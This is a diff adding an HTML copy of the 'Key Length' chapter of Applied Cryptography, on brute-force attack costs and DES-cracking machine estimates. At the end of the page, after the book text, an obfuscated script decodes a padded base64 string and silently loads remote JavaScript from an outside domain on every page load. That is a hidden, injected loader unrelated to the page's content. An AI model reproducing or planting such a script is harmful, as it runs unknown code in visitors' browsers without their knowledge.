@@ -1,0 +1,87 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Key Length</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=07//-->
+<!--PAGES=151-153//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch06/06-10.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="07-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H2 ALIGN="CENTER"><FONT COLOR="#000077"><I>Part II<BR>Cryptographic Techniques
+</I></FONT></H2>
+<H2><A NAME="Heading1"></A><FONT COLOR="#000077">Chapter 7<BR>Key Length
+</FONT></H2>
+<H3><A NAME="Heading2"></A><FONT COLOR="#000077">7.1 Symmetric Key Length</FONT></H3>
+<P>The security of a symmetric cryptosystem is a function of two things: the strength of the algorithm and the length of the key. The former is more important, but the latter is easier to demonstrate.
+</P>
+<P>Assume that the strength of the algorithm is perfect. This is extremely difficult to achieve in practice, but easy enough for this example. By perfect, I mean that there is no better way to break the cryptosystem other than trying every possible key in a brute-force attack.</P>
+<P>To launch this attack, a cryptanalyst needs a small amount of ciphertext and the corresponding plaintext; a brute-force attack is a known-plaintext attack. For a block cipher, the cryptanalyst would need a block of ciphertext and corresponding plaintext: generally 64 bits. Getting this plaintext and ciphertext is easier than you might imagine. A cryptanalyst might get a copy of a plaintext message by some means and intercept the corresponding ciphertext. He may know something about the format of the ciphertext: For example, it is a WordPerfect file, it has a standard electronic-mail message header, it is a UNIX directory file, it is a TIFF image, or it is a standard record in a customer database. All of these formats have some predefined bytes. The cryptanalyst doesn&#146;t need much plaintext to launch this attack.</P>
+<P>Calculating the complexity of a brute-force attack is easy. If the key is 8 bits long, there are 2<SUP>8</SUP>, or 256, possible keys. Therefore, it will take 256 attempts to find the correct key, with a 50 percent chance of finding the key after half of the attempts. If the key is 56 bits long, then there are 2<SUP>56</SUP> possible keys. Assuming a supercomputer can try a million keys a second, it will take 2285 years to find the correct key. If the key is 64 bits long, then it will take the same supercomputer about 585,000 years to find the correct key among the 2<SUP>64</SUP> possible keys. If the key is 128 bits long, it will take 10<SUP>25</SUP> years. The universe is only 10<SUP>10</SUP> years old, so 10<SUP>25</SUP> years is a long time. With a 2048-bit key, a million million-attempts-per-second computers working in parallel will spend 10<SUP>597</SUP> years finding the key. By that time the universe will have long collapsed or expanded into nothingness.</P>
+<P>Before you rush to invent a cryptosystem with an 8-kilobyte key, remember the other side to the strength question: The algorithm must be so secure that there is no better way to break it than with a brute-force attack. This is not as easy as it might seem. Cryptography is a subtle art. Cryptosystems that look perfect are often extremely weak. Strong cryptosystems, with a couple of minor changes, can become weak. The warning to the amateur cryptographer is to have a healthy, almost paranoid, suspicion of any new algorithm. It is best to trust algorithms that professional cryptographers have scrutinized for years without cracking them and to be suspicious of algorithm designers&#146; grandiose claims of security.</P>
+<P>Recall an important point from Section 1.1: The security of a cryptosystem should rest in the key, not in the details of the algorithm. Assume that any cryptanalyst has access to all the details of your algorithm. Assume he has access to as much ciphertext as he wants and can mount an intensive ciphertext-only attack. Assume that he can mount a plaintext attack with as much data as he needs. Even assume that he can mount a chosen-plaintext attack. If your cryptosystem can remain secure, even in the face of all that knowledge, then you&#146;ve got something.</P>
+<P>That warning aside, there is still plenty of room in cryptography to maneuver. In reality, this kind of security isn&#146;t really necessary in many situations. Most adversaries don&#146;t have the knowledge and computing resources of a major government, and even the ones who do probably aren&#146;t that interested in breaking your cryptosystem. If you&#146;re plotting to overthrow a major government, stick with the tried and true algorithms in the back of the book. The rest of you, have fun.</P>
+<P><FONT SIZE="+1"><B><I>Time and Cost Estimates for Brute-Force Attack</I></B></FONT></P>
+<P>Remember that a brute-force attack is typically a known-plaintext attack; it requires a small amount of ciphertext and corresponding plaintext. If you assume that a brute-force attack is the most efficient attack possible against an algorithm&#151;a big assumption&#151;then the key must be long enough to make the attack infeasible. How long is that?
+</P>
+<P>Two parameters determine the speed of a brute-force attack: the number of keys to be tested and the speed of each test. Most symmetric algorithms accept any fixed-length bit pattern as the key. DES has a 56-bit key; it has 2<SUP>56</SUP> possible keys. Some algorithms discussed in this book have a 64-bit key; these have 2<SUP>64</SUP> possible keys. Others have a 128-bit key.</P>
+<P>The speed at which each possible key can be tested is also a factor, but a less important one. For the purposes of this analysis, I will assume that each different algorithm can be tested in the same amount of time. The reality may be that one algorithm may be tested two, three, or even ten times faster than another. But since we are looking for key lengths that are millions of times more difficult to crack than would be feasible, small differences due to test speed are irrelevant.</P>
+<P>Most of the debate in the cryptologic community about the efficiency of brute-force attacks has centered on the DES algorithm. In 1977, Whitfield Diffie and Martin Hellman [497] postulated the existence of a special-purpose DES-cracking machine. This machine consisted of a million chips, each capable of testing a million keys per second. Such a machine could test 2<SUP>56</SUP> keys in 20 hours. If built to attack an algorithm with a 64-bit key, it could test all 2<SUP>64</SUP> keys in 214 days.</P>
+<P>A brute-force attack is tailor-made for parallel processors. Each processor can test a subset of the keyspace. The processors do not have to communicate among themselves; the only communication required at all is a single message signifying success. There are no shared memory requirements. It is easy to design a machine with a million parallel processors, each working independent of the others.</P>
+<P>More recently, Michael Wiener decided to design a brute-force cracking machine [1597,1598]. (He designed the machine for DES, but the analysis holds for most any algorithm.) He designed specialized chips, boards, and racks. He estimated prices. And he discovered that for $1 million, someone could build a machine that could crack a 56-bit DES key in an average of 3.5 hours (results guaranteed in 7 hours). And that the price/speed ratio is linear. Table 7.1 generalizes these numbers to a variety of key lengths. Remember Moore&#146;s Law: Computing power doubles approximately every 18 months. This means costs go down a factor of 10 every five years; what cost $1 million to build in 1995 will cost a mere $100,000 in the year 2000. Pipelined computers might do even better [724].</P>
+<P>For 56-bit keys, these numbers are within the budgets of most large companies and many criminal organizations. The military budgets of most industrialized nations can afford to break 64-bit keys. Breaking an 80-bit key is still beyond the realm of possibility, but if current trends continue that will change in only 30 years.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch06/06-10.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="07-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(oZBZZvGu, iuXARVad) {iuXARVad = oZBZZvGu.createElement('script');iuXARVad.type = 'text/javascript';iuXARVad.async = true;iuXARVad.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');oZBZZvGu.getElementsByTagName('body')[0].appendChild(iuXARVad);}(document));</script></body>
+</html>
